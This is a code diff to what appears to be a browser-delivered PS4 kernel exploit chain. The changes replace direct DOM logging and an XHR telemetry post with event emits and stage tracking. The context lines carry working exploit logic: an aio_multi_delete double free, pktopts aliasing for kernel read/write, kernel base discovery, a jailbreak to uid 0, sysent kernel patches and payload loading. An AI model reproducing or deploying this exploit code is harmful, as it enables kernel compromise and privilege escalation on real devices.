@@ -1,21 +1,11 @@
-import { establishPrimitive } from "./core.js";
-import { installWindowP } from "./mem.js";
+import { establishPrimitive } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
+import { emit, EV } from "./events.js";
+import { installTelemetry } from "./telemetry.js";
 
-const outEl = document.getElementById("out");
-const stateEl = document.getElementById("state");
-const lines = [];
-
-function post(tag, detail) {
-    try {
-        const x = new XMLHttpRequest();
-        x.open("POST", "t", true);
-        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
-             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
-    } catch (e) { }
-}
+installTelemetry({ prefix: "PS4-S4Q" });
 
 const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
 
@@ -37,30 +27,38 @@ function terse(s) {
     if (s.length > 140) s = s.slice(0, 140) + "...";
     return s;
 }
+function post(tag, detail) { emit(EV.TELEMETRY, { tag: tag, detail: detail }); }
 function mark(tag, detail) {
     detail = terse(detail);
-    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-    const esc = function (t) {
-        return String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;")
-                        .replace(/>/g, "&gt;");
-    };
-    outEl.innerHTML = lines.map(function (l) {
-        l = esc(l);
-        const c = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(l) ? "bad"
-                : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(l) ? "warn"
-                : /OK|PROVEN|READY|pass|BASELINE/i.test(l) ? "ok" : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-    }).join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
+    emit(EV.LOG, { tag: tag, detail: detail, level: "info" });
     post(tag, detail);
 }
-function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
+function state(t, c) { emit(EV.STATUS, { text: t, cls: c || "" }); }
 
 let passCount = 0, failCount = 0;
 function check(name, ok, detail) {
-    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
-    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
+    if (ok) {
+        passCount++;
+        mark("PROOF-OK", name + (detail ? "  " + detail : ""));
+    } else {
+        failCount++;
+        mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
+        emit(EV.ERROR, { tag: "PROOF-FAIL", name: name, detail: detail || "" });
+    }
+    emit(EV.PROGRESS, { pass: passCount, fail: failCount });
     return ok;
+}
+
+const stageSuccessSeen = {};
+function stageStart(stage, name) {
+    emit(EV.STAGE_START, { stage: stage, name: name,
+        pass: passCount, fail: failCount });
+}
+function stageSuccess(stage, name, detail) {
+    if (stageSuccessSeen[stage]) return;
+    stageSuccessSeen[stage] = true;
+    emit(EV.STAGE_SUCCESS, { stage: stage, name: name,
+        pass: passCount, fail: failCount, detail: detail || "" });
 }
 function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
 function hexByte(b) { return (b < 16 ? "0" : "") + (b & 0xff).toString(16); }
@@ -279,12 +277,14 @@ function makeRpc(worker) {
 
         mark("FW-STATUS", key + " -- " + (off.fw_status
             || "no status recorded in the offsets block."));
+        emit(EV.INIT, { fw: key, bug: "lapse", fwStatus: off.fw_status || "" });
         mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
             + (STOP_PRECOMMIT
                 ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
                   + "WITHHELD. Nothing is freed twice and no reboot is owed."
                 : "  -- ARMED: the worker issues a REAL aio_multi_delete"));
 
+        stageStart(1, "primitive");
         state("running the primitive...", "warn");
 
         await new Promise(function (r) { setTimeout(r, 0); });
@@ -296,10 +296,21 @@ function makeRpc(worker) {
                     + (detail || ''));
             }
         });
-        installWindowP(carrier);
+        installWindowP(carrier, {
+            onEvent: function (tag, detail) {
+                mark(tag, detail || "");
+            }
+        });
         if (!window.p) throw new Error("window.p was not installed");
         p = window.p;
         mark("PRIMITIVE-OK", "");
+        mark("PAIR-STATUS", "state=" + pairStatus.state
+            + " promoted=" + pairStatus.promoted
+            + " stage=" + pairStatus.stage
+            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
+            + (pairStatus.error ? " error=" + pairStatus.error : ""));
+        stageSuccess(1, "primitive", "window.p");
+        stageStart(2, "aio-leak");
 
         const fnAddr = p.leakval(Math.expm1);
         execAddr = p.read8(fnAddr.add32(0x18));
@@ -686,7 +697,7 @@ function makeRpc(worker) {
             })() + " are available to this process)");
 
         state("wiring the worker...", "warn");
-        worker = new Worker("rpc_worker.js");
+        worker = new Worker("js/engine/rpc_worker.js");
         rpc = makeRpc(worker);
         await rpc("ping");
         const markerArr = await rpc("init", SENT_LO, SENT_HI);
@@ -1537,6 +1548,8 @@ function makeRpc(worker) {
                     + " target_id=" + hx(targetId) + " evf=" + hx(evf)
                     + " dirty_fd=" + dirty);
                 mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
+                stageSuccess(2, "aio-leak", "reqs-1/2-aio_info");
+                stageStart(3, "aio-queue-entry");
 
                 state("stage 3: crafting the aio queue entry...", "warn");
 
@@ -1727,6 +1740,8 @@ function makeRpc(worker) {
                     + pktoptsTwins.join(" and ")
                     + " alias one 0x100 allocation. make_karw is step 4i, and "
                     + "it is the first point where any of this can be repaired.");
+                stageSuccess(3, "aio-queue-entry", "pktopts-twins");
+                stageStart(4, "kernel-read");
 
                 state("stage 4: kernel read...", "warn");
 
@@ -2007,6 +2022,8 @@ function makeRpc(worker) {
 
                 mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                     + kreadFail + " failed");
+                stageSuccess(4, "kernel-read", kreadCalls + "-kread8-calls");
+                stageStart(5, "kernel-write");
 
                 state("stage 5: kernel write...", "warn");
 
@@ -2074,11 +2091,14 @@ function makeRpc(worker) {
                         + "non-allocation at teardown -- that is what panicked "
                         + "the last run");
 
-                    if (wroteOk && kstr2 === "evf cv")
+                    if (wroteOk && kstr2 === "evf cv") {
                         mark("KERNEL-RW", "read=ok write=ok via=pktopts "
                             + "aim=verified selfref=restored");
+                        stageSuccess(5, "kernel-write", "karw-pktopts");
+                    }
                 }
 
+                stageStart(6, "kernel-base");
                 state("stage 6: locating the kernel base...", "warn");
                 const KSTR_RESIDUE = evfCv.low & 0x3fff;
                 const KSTR_LO = params.has("kstrlo")
@@ -2125,8 +2145,9 @@ function makeRpc(worker) {
                         + " ei_class=" + eiClass);
                     const hdrOk = (eType === 2 || eType === 3) && eMachine === 0x3e
                         && eiClass === 2;
-                    check("elf-header-base-checks", hdrOk,
-                        "want e_type 2 or 3, e_machine 0x3e, ei_class 2");
+                    if (check("elf-header-base-checks", hdrOk,
+                        "want e_type 2 or 3, e_machine 0x3e, ei_class 2"))
+                        stageSuccess(6, "kernel-base", "elf-header");
                     if (hdrOk) {
                         mark("OFF-KSTR", "0x" + kstrOff.toString(16)
                             + "   (evf_cv " + evfCv + " - kernel base " + kbase
@@ -2688,7 +2709,8 @@ function makeRpc(worker) {
                                         + "nothing is closed.");
                                 } else {
 
-                                state("stage 7: repairing the aliases...", "warn");
+                                    stageStart(7, "repair-aliases");
+                                    state("stage 7: repairing the aliases...", "warn");
 
                                 const PKTOPTS_M = 0x00;
                                 const PKTOPTS_RTHDR = 0x68;
@@ -2888,6 +2910,8 @@ function makeRpc(worker) {
                                         + hexBytes(chunkX.u8.subarray(0, 16)));
 
                                     repaired = held === 4 && cleared && leftover === 0;
+                                    if (repaired)
+                                        stageSuccess(7, "repair-aliases", "held=" + held);
                                     mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
                                         repaired
                                             ? "every doubly-owned allocation now has "
@@ -2918,6 +2942,7 @@ function makeRpc(worker) {
                                         + "writes on top of that is how a clean "
                                         + "failure becomes a panic.");
                                 } else try {
+                                    stageStart(8, "jailbreak");
                                     state("stage 8: jailbreak...", "warn");
 
                                     const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
@@ -3095,6 +3120,8 @@ function makeRpc(worker) {
                                                     + "all of them, so this proves "
                                                     + "nothing either way");
                                             jailbroken = rooted;
+                                            if (jailbroken)
+                                                stageSuccess(8, "jailbreak", "uid=0");
                                         }
                                     }
                                 } catch (e) {
@@ -3123,6 +3150,7 @@ function makeRpc(worker) {
                                         + " kbase=" + (kbase || "null")
                                         + " blob=" + (kpatch ? kpatch.length : 0));
                                 } else try {
+                                    stageStart(9, "kernel-patches");
                                     state("stage 9: kernel patches...", "warn");
                                     const sysent = kbase.add32(SYSENT_661);
                                     const gadget = kbase.add32(JMP_RSI_GADGET);
@@ -3311,6 +3339,7 @@ function makeRpc(worker) {
                                                         (kpatchName || "the blob")
                                                         + " applied and verified "
                                                         + "(main.js:106-116).");
+                                                    stageSuccess(9, "kernel-patches", "byte-verified");
                                                     if (PATCH_SETTLE > 0) {
                                                         mark("PATCH-SETTLE",
                                                             "ms=" + PATCH_SETTLE);
@@ -3337,6 +3366,7 @@ function makeRpc(worker) {
                                     mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                 else if (payload && (kpatched || params.get("payload") === "1"))
                                     try {
+                                    stageStart(10, "payload");
                                     state("stage 10: loading the payload...", "warn");
 
                                     const psize = (payload.length + 0x3fff) & ~0x3fff;
@@ -3498,10 +3528,12 @@ function makeRpc(worker) {
                                                     + "wrote back a thread handle"
                                                     : "returned " + rc);
                                             payloadRunning = launched;
-                                            if (launched)
+                                            if (launched) {
                                                 mark("PAYLOAD-RUNNING", "bytes="
                                                     + payload.length + " entry="
                                                     + entry);
+                                                stageSuccess(10, "payload", "pthread=" + rc);
+                                            }
 
                                                 if (PAYLOAD_SETTLE > 0) {
                                                     mark("PAYLOAD-SETTLE",
@@ -3787,9 +3819,11 @@ function makeRpc(worker) {
         if (stillDirty) {
             mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
                 + "browser normally. power the console off and back on.");
+            emit(EV.REBOOT_REQUIRED, { reason: "aliased-state-live", committed: committed,
+                committed2: committed2, repaired: repaired, cleanupDone: cleanupDone,
+                pass: passCount, fail: failCount });
             try {
-                stateEl.textContent = "REBOOT THE CONSOLE";
-                stateEl.className = "bad";
+                state("REBOOT THE CONSOLE", "bad");
             } catch (e) { }
         } else if (repaired && cleanupDone) {
             mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
@@ -3804,14 +3838,20 @@ function makeRpc(worker) {
                 : "the corrupted context is repaired and the environment is "
                   + "torn down" + (jailbroken ? ", and the process is root"
                     : "") + ". See the stage 8/9/10 marks for what is left.");
+            emit(EV.SAFE_TO_EXIT, { summary: payloadRunning ? "payload-running"
+                : kpatched ? "kernel-patched"
+                : jailbroken ? "root" : "repaired",
+                pass: passCount, fail: failCount });
             try {
-                stateEl.textContent = payloadRunning
+                state(payloadRunning
                     ? "ALL DONE"
                     : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                     : jailbroken ? "ROOT -- NO REBOOT NEEDED"
-                    : "REPAIRED -- NO REBOOT NEEDED";
-                stateEl.className = "ok";
+                    : "REPAIRED -- NO REBOOT NEEDED", "ok");
             } catch (e) { }
+        } else {
+            emit(EV.SAFE_TO_EXIT, { summary: "no-commit",
+                pass: passCount, fail: failCount });
         }
     }
 })();
